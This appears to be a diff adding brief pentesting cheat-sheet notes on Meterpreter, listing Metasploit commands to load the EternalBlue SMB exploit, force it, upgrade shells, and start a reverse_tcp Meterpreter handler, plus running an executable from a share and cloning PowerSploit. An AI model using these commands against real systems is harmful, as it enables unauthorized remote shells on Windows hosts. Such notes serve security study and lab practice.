@@ -1,0 +1,23 @@
+## Meterpreter
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/ 
+
+use exploit/windows/smb/ms1701_eternalblue 
+Regular shells can usually be upgraded to meterpreter shells by using the module post/multi/manage/shell_to_meterpreter 
+
+set ForceExploit True 
+
+
+use exploit/multi/handler 
+set payload windows/meterpreter/reverse_tcp 
+set LHOST 
+set LPORT 
+options 
+run 
+
+on windows machine search
+ip/share/test.exe 
+
+on linux
+gitclone https://github.com/PowerShellMafia/PowerSploit 
+
+
